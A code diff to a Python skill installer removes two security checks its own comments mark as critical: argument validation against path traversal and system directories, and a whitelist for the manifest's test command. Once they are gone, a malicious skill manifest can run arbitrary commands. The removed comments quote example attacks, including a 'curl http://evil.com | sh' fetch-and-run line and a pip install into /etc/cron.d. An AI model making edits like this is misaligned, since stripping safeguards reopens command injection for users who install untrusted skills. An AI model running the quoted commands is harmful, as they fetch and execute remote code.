@@ -307,40 +307,6 @@ def apply_skill(skill_dir: str | Path) -> ApplyResult:
             "python3 -m pytest",
             "pytest",
         )
-        # SK-01 FIX (CRITICAL): after prefix matching, also validate that each
-        # argument does not contain path traversal sequences or absolute paths
-        # outside the workspace.  A prefix check alone allows attacks like
-        # "pip install --target=/etc/cron.d malicious" because "pip install"
-        # is a valid prefix; argument validation below closes that gap.
-        _UNSAFE_ARG_PATTERNS = (
-            "..",
-            "/etc", "/usr", "/proc", "/sys",
-            "/bin", "/sbin", "/lib", "/lib64",
-            "/boot", "/root", "/var", "/run",
-            "/dev",
-        )
-
-        def _is_safe_arg(arg: str) -> bool:
-            """Return False if arg looks like a dangerous path argument."""
-            # Block absolute paths not within the project workspace
-            if arg.startswith("/"):
-                return str(project_root) != "/" and arg.startswith(str(project_root))
-            # Block traversal regardless of position
-            if ".." in arg:
-                return False
-            # Block known sensitive path prefixes
-            for _pat in _UNSAFE_ARG_PATTERNS:
-                if arg == _pat or arg.startswith(_pat + "/") or arg.startswith(_pat + "="):
-                    return False
-            # Block --flag=<unsafe-path> forms
-            if "=" in arg:
-                _, _, _val = arg.partition("=")
-                if _val.startswith("/") and not _val.startswith(str(project_root)):
-                    return False
-                if ".." in _val:
-                    return False
-            return True
-
         for cmd in manifest.post_apply:
             cmd_lower = cmd.strip().lower()
             if not any(cmd_lower.startswith(p) for p in _POST_APPLY_ALLOWED_PREFIXES):
@@ -350,17 +316,8 @@ def apply_skill(skill_dir: str | Path) -> ApplyResult:
                     f"Allowed prefixes: {_POST_APPLY_ALLOWED_PREFIXES}"
                 )
                 continue
-            # SK-01: validate each argument for unsafe path references
-            _cmd_args = shlex.split(cmd, posix=(platform.system() != "Windows"))
-            _unsafe = [a for a in _cmd_args[1:] if not _is_safe_arg(a)]
-            if _unsafe:
-                print(
-                    f"WARNING: post_apply command {cmd!r} contains unsafe argument(s) "
-                    f"{_unsafe!r} and will be skipped for security reasons."
-                )
-                continue
             try:
-                args = _cmd_args
+                args = shlex.split(cmd, posix=(platform.system() != "Windows"))
                 subprocess.run(
                     args, shell=False, cwd=str(project_root), timeout=120, check=True
                 )
@@ -399,35 +356,6 @@ def apply_skill(skill_dir: str | Path) -> ApplyResult:
 
         # --- Run test command ---
         if manifest.test:
-            # SK-02 FIX (CRITICAL): whitelist manifest.test to a narrow set of safe
-            # commands before passing to shlex.split + subprocess.run.  Without this
-            # a compromised or malicious skill manifest could inject arbitrary shell
-            # commands (e.g. "curl http://evil.com | sh") via the test field.
-            _TEST_ALLOWED_PREFIXES = (
-                "pytest",
-                "python -m pytest",
-                "python3 -m pytest",
-                "python test_",
-                "python3 test_",
-            )
-            _test_stripped = manifest.test.strip()
-            if not any(_test_stripped.startswith(p) for p in _TEST_ALLOWED_PREFIXES):
-                for f in added_files:
-                    f.unlink(missing_ok=True)
-                restore_backup()
-                state = read_state()
-                state.applied_skills = [s for s in state.applied_skills if s.name != manifest.skill]
-                write_state(state)
-                clear_backup()
-                return ApplyResult(
-                    success=False,
-                    skill=manifest.skill,
-                    version=manifest.version,
-                    error=(
-                        f"Rejected manifest.test command {_test_stripped!r}: not in allowed whitelist. "
-                        f"Allowed prefixes: {_TEST_ALLOWED_PREFIXES}"
-                    ),
-                )
             try:
                 test_args = shlex.split(manifest.test, posix=(platform.system() != "Windows"))
                 subprocess.run(
